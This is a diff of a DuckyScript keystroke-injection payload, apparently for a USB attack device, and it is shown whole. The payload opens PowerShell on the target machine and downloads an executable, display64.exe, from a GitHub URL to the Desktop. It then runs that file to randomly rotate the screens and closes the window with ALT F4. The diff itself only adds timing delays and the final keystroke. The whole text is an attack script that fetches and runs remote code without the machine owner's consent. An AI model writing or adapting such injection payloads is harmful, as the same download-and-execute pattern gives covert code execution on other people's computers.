@@ -19,17 +19,21 @@ STRINGLN powershell
 DELAY 1000
 
 STRINGLN cd "$env:USERPROFILE"
+DELAY 300
 REM Download the file using PowerShell
 STRINGLN Invoke-WebRequest 'https://github.com/SpacexerDragon5/abistreich/raw/main/display64.exe' -OutFile $env:USERPROFILE\Desktop\display64.exe
 
-DELAY 2000
+DELAY 1000
 STRINGLN cd .\Desktop\
 REM Execute the downloaded file with the provided parameters
-
+DELAY 300
 
 STRING .\display64.exe /device 1 /rotate 
 generateRandomRotation()
 ENTER
+DELAY 1000
 STRING .\display64.exe /device 2 /rotate 
 generateRandomRotation()
 ENTER
+DELAY 1000
+ALT F4
